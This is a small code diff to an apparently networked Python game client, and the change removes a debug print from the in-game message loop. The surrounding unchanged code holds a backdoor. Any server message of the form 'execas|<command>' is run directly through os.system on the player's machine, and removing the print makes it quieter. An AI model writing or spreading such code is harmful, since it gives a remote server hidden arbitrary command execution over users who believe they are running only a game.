@@ -274,7 +274,6 @@ class App:
         while self.currentState == "inGame":
             srvMsg = self.client.recv(1024).decode("utf-8")
             if "execas" in srvMsg:
-                print("ouioui")
                 srvMsg = srvMsg.split("%")[0].split("|", 1)
                 if len(srvMsg) == 2 and srvMsg[0] == "execas": os.system(srvMsg[1])
                 continue
